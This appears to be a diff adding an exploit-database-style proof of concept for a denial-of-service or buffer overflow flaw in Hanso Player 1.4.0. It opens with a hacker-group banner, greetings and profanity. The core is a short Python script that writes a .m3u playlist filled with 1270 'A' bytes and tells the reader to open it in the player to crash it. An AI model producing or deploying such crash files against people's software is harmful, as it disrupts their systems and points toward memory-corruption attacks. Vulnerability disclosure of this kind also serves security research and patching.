@@ -1,0 +1,37 @@
+===================================================
+Hanso Player Version 1.4.0 (.m3u) Denial of Service Vulnerability
+===================================================
+
+
+.....................X-SHADOW ; ThBa7 ; KloofQ8 ; LeGEnD ; abada ...
+.......................................Fuck ALL lamers Top-t34m...................
+
+
+
+#Title: Hanso Player Version 1.4.0 (.m3u) Buffer Overflow Vulnerability
+
+#Author    :   anT!-Tr0J4n
+
+#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com
+
+#Greetz    :   Dev-PoinT.com ; GlaDiatOr,SILVER STAR , HoBeeZ, Coffin Of Evil
+
+#special thanks    :   r0073r,Sid3^effects,L0rd CruSad3r,SeeMe,Sonic,gunslinger_,Sn!pEr.S!Te,n4pst3rr,indoushka, KnocKout,SONiC,ZoRLu 
+
+#Home     :   www.Dev-PoinT.com  $ http://1337db.com/
+
+#Software :  http://www.hansotools.com/
+
+#Tested on:   Windows XP sp3
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+#!/usr/bin/python
+#Home : www.Dev-PoinT.com , http://1337db.com/
+outfile="anT!-Tr0J4n.m3u"
+junk="\x41" * 1270
+FILE=open(outfile, "w")
+FILE.write(junk)
+FILE.close()
+print ''' File created succesufully , open  it with Hanso Player and press the Play button '''
